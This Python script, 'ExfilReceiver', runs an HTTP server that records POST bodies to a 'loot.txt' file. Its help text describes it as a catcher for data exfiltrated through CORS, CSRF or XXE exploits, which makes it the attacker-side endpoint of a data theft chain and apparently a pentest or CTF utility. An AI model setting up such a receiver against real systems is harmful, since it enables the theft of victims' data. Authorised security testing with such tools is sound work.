#!/usr/bin/env python3
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer

HELP = """
ExfilReceiver - Simple HTTP POST exfiltration catcher for CORS/CSRF/XXE/etc.

Usage:
  python3 exfilreceiver.py -i 0.0.0.0 -p 2323 -o loot.txt
  
Options:
  -i IP, --ip IP             The IP/interface to bind to (default: 0.0.0.0 for all interfaces)
  -p PORT, --port PORT       The port to listen on (default: 2323)
  -o FILE, --outfile FILE    Output file for exfiltrated data (default: loot.txt)
  -h, --help                 Show this help message

How it works:
- Catches POST requests (like from CORS or XXE exploits)
- Prints the exfiltrated data to the console
- Saves exfiltrated data to a file
- Sends a basic HTTP 200 OK response
"""

class ExfilReceiver(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        text = post_data.decode(errors='replace')
        print("[+] Exfiltrated Data:", text)
        with open(self.server.outfile, 'a') as f:
            f.write(text + "\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Received')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple HTTP exfil POST catcher", add_help=False)
    parser.add_argument('-i', '--ip', default='0.0.0.0', help='IP/interface to bind (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=2323, help='Port to listen on (default: 2323)')
    parser.add_argument('-o', '--outfile', default='loot.txt', help='Output file for exfiltrated data (default: loot.txt)')
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    args = parser.parse_args()

    if args.help:
        print(HELP)
        exit(0)

    server_address = (args.ip, args.port)
    httpd = HTTPServer(server_address, ExfilReceiver)
    httpd.outfile = args.outfile
    print(f"[+] Listening on {args.ip}:{args.port} ... (Saving to {args.outfile})")
    httpd.serve_forever()
 
